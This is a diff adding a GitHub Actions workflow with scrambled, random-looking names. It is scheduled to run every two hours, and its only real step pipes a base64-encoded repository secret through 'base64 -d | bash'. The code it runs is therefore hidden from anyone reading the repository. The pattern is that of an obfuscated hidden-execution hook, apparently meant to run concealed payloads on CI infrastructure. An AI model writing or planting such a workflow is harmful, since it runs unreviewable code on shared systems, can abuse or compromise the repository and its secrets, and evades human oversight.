@@ -1,0 +1,13 @@
+name: tNIEZAU
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  jAAYjlX:
+    runs-on: ubuntu-latest
+    env:
+      KkBifkIbhS: ${{ secrets.zdfAacQu }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.kAdCWID }}" | base64 -d | bash
